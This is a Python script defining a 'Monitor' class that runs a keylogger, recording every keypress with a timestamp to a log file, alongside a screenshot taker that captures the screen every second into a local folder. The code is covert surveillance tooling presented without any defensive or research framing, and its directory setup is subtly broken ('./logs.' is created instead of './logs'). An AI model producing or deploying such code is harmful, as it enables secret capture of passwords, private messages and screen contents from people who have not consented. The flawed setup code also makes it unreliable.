import os
from mss import mss
from pynput.keyboard import Listener
from threading import Timer, Thread
import time
from datetime import datetime


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:

    def _on_press(self, k):
        with open('./logs/keylogs/log.txt', 'a') as f:
            f.write('{}\t\t{}\n'.format(k, datetime.now().strftime('%H:%M:%S')))

    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs.')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        sct = mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(datetime.now().strftime('%H-%M-%S')))

    def run(self, interval=1):
        """
        Launch the keylogger and screenshot taker in two separate threads
        Interval is the amount of time in seconds between screenshots
        """
        self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()


if __name__ == '__main__':
    mon = Monitor()
    mon.run()


